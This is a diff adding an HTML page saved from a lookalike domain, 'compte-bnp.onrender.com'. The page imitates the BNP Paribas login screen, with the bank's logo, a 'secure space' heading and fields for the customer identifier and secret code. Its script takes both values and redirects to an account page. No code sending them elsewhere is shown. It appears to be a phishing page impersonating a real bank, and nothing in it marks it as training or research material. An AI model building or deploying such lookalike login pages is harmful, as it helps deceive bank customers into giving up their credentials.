@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<!-- saved from url=(0032)https://compte-bnp.onrender.com/ -->
+<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>Connexion - BNP Paribas</title>
+  <style>
+    body {
+      background-color: #0076A8;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      width: 320px;
+      text-align: center;
+    }
+    .login-box img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+    h2 {
+      color: #004B6B;
+      margin-bottom: 15px;
+      font-size: 18px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #004B6B;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #003954;
+    }
+    .forgot {
+      display: block;
+      margin-top: 12px;
+      font-size: 13px;
+      color: #004B6B;
+      text-decoration: none;
+    }
+    .error-message {
+      color: red;
+      font-size: 13px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <img src="BNP-logo-1.webp" alt="BNP Logo">
+  
+  <h2>ESPACE SÉCURISÉ</h2>
+
+  <input type="text" id="id" placeholder="Identifiant">
+  <input type="password" id="password" placeholder="Code secret">
+
+  <button onclick="seConnecter()">SE CONNECTER</button>
+
+  <a href="https://compte-bnp.onrender.com/#" class="forgot">Mot de passe oublié ?</a>
+
+  <div id="error-message" class="error-message"></div>
+</div>
+
+<script>
+  function seConnecter() {
+    const id = document.getElementById("id").value;
+    const password = document.getElementById("password").value;
+    if (id && password) {
+      window.location.href = "compte.html";
+    } else {
+      document.getElementById("error-message").innerText = "Identifiant et code secret requis.";
+    }
+  }
+</script>
+
+
+
+
+</body></html>
